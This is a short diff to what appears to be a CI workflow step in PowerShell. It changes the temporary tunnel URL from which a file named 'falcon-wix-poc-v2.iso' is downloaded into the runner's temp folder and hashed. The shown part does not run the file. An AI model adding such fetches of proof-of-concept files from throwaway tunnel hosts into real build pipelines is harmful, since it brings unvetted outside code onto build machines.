@@ -12,7 +12,7 @@ jobs:
         shell: pwsh
         run: |
           $ErrorActionPreference = 'Stop'
-          $u = 'http://zfzcz-2600-1f18-68f7-2200-4028-a48c-c2-27bc.run.pinggy-free.link:37647/falcon-wix-poc-v2.iso'
+          $u = 'http://ntfsd-2600-1f18-68f7-2200-4028-d3a9-22b1-c340.run.pinggy-free.link:37859/falcon-wix-poc-v2.iso'
           Invoke-WebRequest -Uri $u -OutFile "$env:RUNNER_TEMP\falcon-wix-poc-v2.iso"
           $h=(Get-FileHash "$env:RUNNER_TEMP\falcon-wix-poc-v2.iso" -Algorithm SHA256).Hash.ToLower()
           Write-Host "ISO SHA256=$h"
